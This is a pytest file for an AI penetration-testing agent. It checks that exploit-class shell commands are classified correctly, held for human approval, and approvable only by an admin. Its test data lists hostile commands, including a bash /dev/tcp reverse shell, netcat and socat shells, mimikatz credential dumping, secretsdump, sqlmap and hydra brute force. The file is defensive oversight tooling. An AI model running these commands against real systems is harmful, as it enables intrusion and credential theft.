"""
E4 PoC approval chain tests.

Three layers:
  1. the exploit classifier — what counts as exploit-class (and what a
     scanner-ish command must NOT match);
  2. the agent side — _run_shell parks on a PendingCommand and adopts the
     human decision (approved → executed result, rejected/timeout → blocked);
  3. the approve endpoint — exploit-class commands need an admin when
     exploit_admin_approval is on, and the approver of record is the
     authenticated identity, not a client-supplied string.

Hermetic: agent DB sessions rebound to the test engine, sleeps/time faked,
container execution stubbed, async endpoint sessions created on the test DB.
"""
from __future__ import annotations

import os
from types import SimpleNamespace

import pytest
from fastapi import HTTPException
from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine

from auth import hash_password
from models.assessment import Assessment
from models.pending_command import PendingCommand
from models.platform_settings import PlatformSettings
from models.user import User
from schemas.pending_command import PendingCommandApprove
from services.agent import agent_settings as agent_settings_mod
from services.agent.scope import parse_scope
from services.agent import tools as tools_mod
from utils.exploit_classify import classify_exploit_risk


@pytest.fixture()
def agent_settings(monkeypatch, db, runtime_sessions):
    """Write agent_* settings rows visible to the code under test (its TTL
    cache is cleared around every write and after the test)."""
    monkeypatch.setattr(agent_settings_mod, "SessionLocal", runtime_sessions)

    def _set(key: str, value: str) -> None:
        row = db.query(PlatformSettings).filter(
            PlatformSettings.key == key).first()
        if row:
            row.value = value
        else:
            db.add(PlatformSettings(key=key, value=value, description="test"))
        db.commit()
        agent_settings_mod.invalidate_settings_cache()

    agent_settings_mod.invalidate_settings_cache()
    yield _set
    agent_settings_mod.invalidate_settings_cache()


# --- 1) classifier -----------------------------------------------------------

EXPLOIT_COMMANDS = [
    "sqlmap -u http://target.example.com/?id=1 --batch --dbs",
    "hydra -L users.txt -P rock.txt ssh://10.0.0.5",
    "impacket-psexec administrator:pw@10.0.0.7",
    "impacket-secretsdump target.lab/admin:pw@10.0.0.7",
    "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_deploy'",
    "mimikatz # sekurlsa::logonpasswords",
    "evil-winrm -i 10.0.0.7 -u admin -p pw",
    "nc -lvnp 4444 -e /bin/bash",
    "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1",
    "socat TCP-LISTEN:4444,fork exec:/bin/sh",
    "python3 exploit.py 10.0.0.7 8180",
    "responder -I eth0",
    # wrapped invocations still count — the prefix peeling must reach the tool
    "sudo sqlmap -u http://target.example.com/?id=1 --batch",
    "timeout 600 hydra -L users.txt -P rock.txt ssh://10.0.0.5",
    "python3 psexec.py domain/user:pw@10.0.0.7",
    # a presence check FOLLOWED by a real run: the run wins
    "command -v nmap; sqlmap -u http://target.example.com/?id=1 --batch",
]

SCANNER_COMMANDS = [
    "nmap -sV -p- 10.0.0.0/24",
    "nikto -h http://target.example.com",
    "ffuf -w words.txt -u http://target.example.com/FUZZ",
    "nuclei -u http://target.example.com",
    "curl -s http://target.example.com/robots.txt",
    "gobuster dir -u http://target.example.com -w words.txt",
    "echo hello && ls -la",
    # presence checks MENTION exploit tools without invoking them — the
    # classifier must not approval-wall the agent's own tooling pre-flight
    # (observed live: `command -v sqlmap` tripped exploit:sqlmap-exploitation)
    "command -v sqlmap",
    "which hydra medusa hashcat",
    "for t in sh bash curl nmap ffuf nuclei httpx sqlmap python3 dig; "
    "do command -v \"$t\" >/dev/null 2>&1 && echo \"$t OK\" || echo \"$t MISSING\"; done",
    "grep -ri mimikatz notes.txt",
    "echo 'checking: evil-winrm'",
    "ls /usr/share/webshells || true",
]


@pytest.mark.parametrize("command", EXPLOIT_COMMANDS)
def test_exploit_commands_classified_high(command):
    risk, reason = classify_exploit_risk(command)
    assert risk == "high", command
    assert reason


@pytest.mark.parametrize("command", SCANNER_COMMANDS)
def test_scanners_are_not_exploit_class(command):
    risk, reason = classify_exploit_risk(command)
    assert risk == "normal", command


# --- 2) agent side -----------------------------------------------------------

@pytest.fixture()
def assessment(db):
    row = Assessment(name="poc-approval-test")
    db.add(row)
    db.commit()
    db.refresh(row)
    return row


def _executor(db, assessment):
    return tools_mod.ToolExecutor(db, assessment.id, parse_scope("example.com"))


def _flip_later(runtime_sessions, **updates):
    """Async stand-in for asyncio.sleep: on first call, resolve the pending
    exploit command exactly the way the human's endpoint would."""
    async def _sleep(_sec):
        s = runtime_sessions()
        try:
            row = s.query(PendingCommand).filter(
                PendingCommand.status == "pending").one()
            for k, v in updates.items():
                setattr(row, k, v)
            s.commit()
        finally:
            s.close()
    return _sleep


async def test_approval_approved_executes_and_adopts_result(
        db, runtime_sessions, agent_settings, monkeypatch, assessment):
    agent_settings("exploit_approval", "on")
    agent_settings("exploit_approval_timeout", "60")
    monkeypatch.setattr(tools_mod, "SessionLocal", runtime_sessions)
    monkeypatch.setattr(
        tools_mod.asyncio, "sleep",
        _flip_later(runtime_sessions, status="executed",
                    execution_result={"success": True, "returncode": 0,
                                      "stdout": "[*] dumping tables", "stderr": ""}))

    ex = _executor(db, assessment)
    res = await ex._request_exploit_approval(
        "sqlmap -u http://example.com/?id=1 --batch", "sqlmap-exploitation")

    # The parked command itself is exploit-class.
    row = db.query(PendingCommand).one()
    assert row.risk_level == "high"
    assert row.risk_reason == "sqlmap-exploitation"
    assert row.matched_keywords == ["exploit:sqlmap-exploitation"]

    assert res["approved"] is True
    assert res["ok"] is True
    assert "dumping tables" in res["stdout"]


async def test_approval_rejected_blocks(
        db, runtime_sessions, agent_settings, monkeypatch, assessment):
    agent_settings("exploit_approval", "on")
    monkeypatch.setattr(tools_mod, "SessionLocal", runtime_sessions)
    monkeypatch.setattr(
        tools_mod.asyncio, "sleep",
        _flip_later(runtime_sessions, status="rejected",
                    rejection_reason="out of engagement scope"))

    ex = _executor(db, assessment)
    res = await ex._request_exploit_approval(
        "hydra -L users.txt -P rock.txt http://example.com", "credential-brute-force")

    assert res["ok"] is False
    assert res["blocked"] == "approval_rejected"
    assert "out of engagement scope" in res["error"]
    assert ex.blocked_actions == 1


async def test_approval_times_out_without_human(
        db, runtime_sessions, agent_settings, monkeypatch, assessment):
    agent_settings("exploit_approval", "on")
    agent_settings("exploit_approval_timeout", "600")
    monkeypatch.setattr(tools_mod, "SessionLocal", runtime_sessions)

    # Fake clock. NOTE: patching time.monotonic is global for the test's
    # duration — values must also cover the settings-cache TTL probe that
    # runs inside int_setting(): cache probe → deadline base → loop check.
    ticks = iter([1000.0, 0.0, 100000.0])
    monkeypatch.setattr(tools_mod.time, "monotonic", lambda: next(ticks, 100000.0))

    async def _no_sleep(_sec):
        raise AssertionError("should exit on the fake clock before sleeping")
    monkeypatch.setattr(tools_mod.asyncio, "sleep", _no_sleep)

    ex = _executor(db, assessment)
    res = await ex._request_exploit_approval(
        "python3 exploit.py 10.0.0.7 8180", "exploit-script")

    assert res["ok"] is False
    assert res["blocked"] == "approval_timeout"
    assert "was not executed" in res["error"]
    assert ex.blocked_actions == 1


class _FakeAsyncSessionCtx:
    async def __aenter__(self):
        return None

    async def __aexit__(self, *exc):
        return False


async def test_run_shell_routes_exploit_through_chain(
        db, runtime_sessions, agent_settings, monkeypatch, assessment):
    """End-to-end through the tool: an exploit command in scope, open mode,
    approval chain on → parked for a human, not executed."""
    agent_settings("exploit_approval", "on")
    monkeypatch.setattr(tools_mod, "SessionLocal", runtime_sessions)
    monkeypatch.setattr(tools_mod, "AsyncSessionLocal",
                        lambda: _FakeAsyncSessionCtx())
    executed = []

    async def _fake_exec(self, **kw):
        executed.append(kw.get("command"))
        return SimpleNamespace(stdout="should not happen", stderr="",
                               returncode=0, success=True, id=None)

    from services.container_service import ContainerService
    monkeypatch.setattr(ContainerService, "execute_and_log_command", _fake_exec)
    monkeypatch.setattr(
        tools_mod.asyncio, "sleep",
        _flip_later(runtime_sessions, status="rejected", rejection_reason="no"))

    ex = _executor(db, assessment)
    res = await ex._run_shell({"command":
                               "sqlmap -u http://example.com/?id=1 --batch"})

    assert res["blocked"] == "approval_rejected"
    assert executed == []  # never reached the container without a human
    assert db.query(PendingCommand).one().risk_level == "high"


async def test_run_shell_exploit_chain_disabled_runs(
        db, runtime_sessions, agent_settings, monkeypatch, assessment):
    """Approval chain off → the same command goes straight to the container."""
    agent_settings("exploit_approval", "off")
    monkeypatch.setattr(tools_mod, "AsyncSessionLocal",
                        lambda: _FakeAsyncSessionCtx())

    from services.container_service import ContainerService

    async def _fake_exec(self, **kw):
        return SimpleNamespace(stdout="sqlmap banner", stderr="",
                               returncode=0, success=True, id=42)

    monkeypatch.setattr(ContainerService, "execute_and_log_command", _fake_exec)

    ex = _executor(db, assessment)
    res = await ex._run_shell({"command":
                               "sqlmap -u http://example.com/?id=1 --batch"})

    assert res["ok"] is True
    assert res["command_id"] == 42
    assert db.query(PendingCommand).count() == 0


# --- 3) approve endpoint admin gate -------------------------------------------

def _async_test_url() -> str:
    """TEST database URL in asyncpg form (mirrors conftest._base_url)."""
    from config import settings as app_settings
    test_db = os.environ.get("TEST_DATABASE_DB", "aida_test")
    url = os.environ.get("TEST_DATABASE_URL") or app_settings.DATABASE_URL
    url = url.split("?", 1)[0]
    base = url.rsplit("/", 1)[0]
    if base.startswith("postgresql+asyncpg://"):
        return f"{base}/{test_db}"
    if base.startswith("postgresql://"):
        base = base.replace("postgresql://", "postgresql+asyncpg://", 1)
    return f"{base}/{test_db}"


def _request_for(user):
    return SimpleNamespace(
        state=SimpleNamespace(user=user), headers={}, method="POST",
        url=SimpleNamespace(path="/api/pending-commands/x/approve"),
        client=SimpleNamespace(host="test"))


@pytest.fixture()
def users(db):
    admin = User(username="poc-admin", email="poc-admin@t.local",
                 hashed_password=hash_password("pw"), role="admin", is_active=True)
    auditor = User(username="poc-auditor", email="poc-auditor@t.local",
                   hashed_password=hash_password("pw"), role="auditor",
                   is_active=True)
    db.add_all([admin, auditor])
    db.commit()
    return {"admin": admin, "auditor": auditor}


async def test_approve_exploit_requires_admin(db, runtime_sessions, users,
                                               monkeypatch, assessment):
    import api.pending_commands as pc
    from services.container_service import ContainerService
    # exploit_admin_approval unset → defaults ON.

    row = PendingCommand(
        assessment_id=assessment.id,
        command="sqlmap -u http://example.com/?id=1 --batch",
        phase="autonomous", command_type="shell", status="pending",
        risk_level="high", risk_reason="sqlmap-exploitation")
    db.add(row)
    db.commit()

    # audit() inside the endpoint opens its own session — keep it on the test DB.
    monkeypatch.setattr(pc, "SessionLocal", runtime_sessions)

    executed = []

    async def _fake_exec(self, **kw):
        executed.append(kw.get("command"))
        return SimpleNamespace(stdout="dumped", stderr="", returncode=0,
                               success=True)

    monkeypatch.setattr(ContainerService, "execute_and_log_command", _fake_exec)

    engine = create_async_engine(_async_test_url())
    maker = async_sessionmaker(engine, expire_on_commit=False)
    try:
        # exploit_admin_approval defaults ON → auditor is denied.
        async with maker() as adb:
            with pytest.raises(HTTPException) as ei:
                await pc.approve_command(
                    row.id, PendingCommandApprove(approved_by="root"),
                    _request_for(users["auditor"]), db=adb)
            assert ei.value.status_code == 403
            await adb.rollback()

        # Denial left the command pending (re-approvable by an admin).
        db.refresh(row)
        assert row.status == "pending"

        # Admin approves; identity of record = authenticated admin, not the
        # client-supplied "root".
        async with maker() as adb:
            resp = await pc.approve_command(
                row.id, PendingCommandApprove(approved_by="root"),
                _request_for(users["admin"]), db=adb)
            assert resp.status == "executed"
            assert resp.resolved_by == "poc-admin"
    finally:
        await engine.dispose()

    assert executed == ["sqlmap -u http://example.com/?id=1 --batch"]


async def test_approve_exploit_admin_gate_can_be_relaxed(
        db, runtime_sessions, users, monkeypatch, assessment):
    import api.pending_commands as pc
    from services.container_service import ContainerService

    db.add(PlatformSettings(key="exploit_admin_approval", value="false"))
    row = PendingCommand(
        assessment_id=assessment.id, command="nc -lvnp 4444 -e /bin/bash",
        phase="autonomous", command_type="shell", status="pending",
        risk_level="high", risk_reason="reverse-shell")
    db.add(row)
    db.commit()

    monkeypatch.setattr(pc, "SessionLocal", runtime_sessions)

    async def _fake_exec(self, **kw):
        return SimpleNamespace(stdout="", stderr="", returncode=0, success=True)

    monkeypatch.setattr(ContainerService, "execute_and_log_command", _fake_exec)

    engine = create_async_engine(_async_test_url())
    maker = async_sessionmaker(engine, expire_on_commit=False)
    try:
        async with maker() as adb:
            resp = await pc.approve_command(
                row.id, PendingCommandApprove(),
                _request_for(users["auditor"]), db=adb)
            assert resp.status == "executed"
    finally:
        await engine.dispose()
